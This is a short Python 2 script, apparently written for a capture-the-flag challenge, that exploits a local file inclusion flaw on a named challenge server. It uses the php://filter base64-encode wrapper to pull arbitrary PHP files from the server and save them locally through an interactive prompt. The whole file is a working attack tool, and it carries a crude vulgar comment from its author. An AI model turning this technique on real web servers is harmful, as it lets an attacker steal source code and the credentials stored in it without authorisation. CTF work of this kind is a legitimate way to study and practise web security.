#!/usr/bin/python2
# coding: utf-8
# file dumper for the trolol ctf chall.
# hack@theplanet:~$ python trolol_fileread.py 
# [file to read]> info
# [save path]> /tmp/info
# {*} Getting File: info
# {+} File info saved to /tmp/info
# [file to read]> ^C{i} ^C hit, quitting
# hack@theplanet:~$ cat /tmp/info
# <?php phpinfo(); ?>
# hack@theplanet:~$ 
# ~ skyhighatrist 
import requests
import sys
debug = True # disregard this i suck cocks

def read_file(remote_file_path, local_file_path):
    # read the file in via lfi
    print "{*} Getting File: %s" %(remote_file_path)
    url = "http://challs.campctf.ccc.ac:10119/?page=php://filter/convert.base64-encode/resource=%s" %(remote_file_path)
    try:
        r = requests.get(url)
    except Exception, e:
        print "{!} Error getting file."
        if debug == True:
            sys.exit("{!} Stack Trace: %s" %(str(e)))
        else:
            pass
    try:
        outfile = r.text.strip()
        outfile = outfile.decode("base64")
    except Exception, e:
        print "{!} Error decoding file."
        if debug == True:
            sys.exit("{!} Stack Trace: %s" %(str(e)))
        else:
            pass
    try:
        f = open(local_file_path, "wb")
        f.write(outfile)
        f.close()
    except Exception, e:
        print "{!} Error saving file."
        if debug == True:
            sys.exit("{!} Stack Trace: %s" %(str(e)))
        else:
            pass
    print "{+} File %s saved to %s" %(remote_file_path, local_file_path)

def read_shell():
    print "WARNING: IN THIS VERSION CAN ONLY READ .php FILES!!!"
    while True:
        try:
            rem = raw_input("[file to read]> ")
        except KeyboardInterrupt:
            sys.exit("{i} ^C hit, quitting")    
        try:
            loc = raw_input("[save path]> ")
        except KeyboardInterrupt:
            sys.exit("{i} ^C hit, quitting")
        read_file(remote_file_path=rem, local_file_path=loc)

if __name__ == "__main__":
    read_shell()
